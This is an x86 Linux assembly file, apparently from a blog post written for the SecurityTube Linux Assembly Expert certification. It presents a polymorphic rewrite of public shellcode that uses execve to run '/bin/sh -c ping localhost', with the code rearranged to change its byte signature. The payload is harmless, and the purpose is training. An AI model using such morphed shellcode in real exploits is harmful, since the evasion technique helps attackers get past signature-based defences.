; orig shellcode: http://shell-storm.org/shellcode/files/shellcode-632.php
; morphed version by Sandro "guly" Zaccarini

global _start

section .text

_start:
; original code assume some regs are already nulls. i want to be sure and zero eax and edx
xor eax,eax
push eax
pop edx

; nice trick to "ping localhost  " !!
push   0x20207473
push   0x6f686c61
; to split someway the string
add esp,0xc
push eax
sub esp,0x8
push   0x636f6c20
push   0x676e6970

mov al,0xb

xor    esi,esp

push   edx
push word  0x632d

xor    ecx,esp
push   edx
push   0x68732f2f
push   0x6e69622f
xor    ebx,esp

push   edx
push   esi
push   ecx
push   ebx
mov ecx,edx
xor    ecx,esp
int    0x80

; original length: 57
; current length: 65
; total save: -8 :(
;
; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
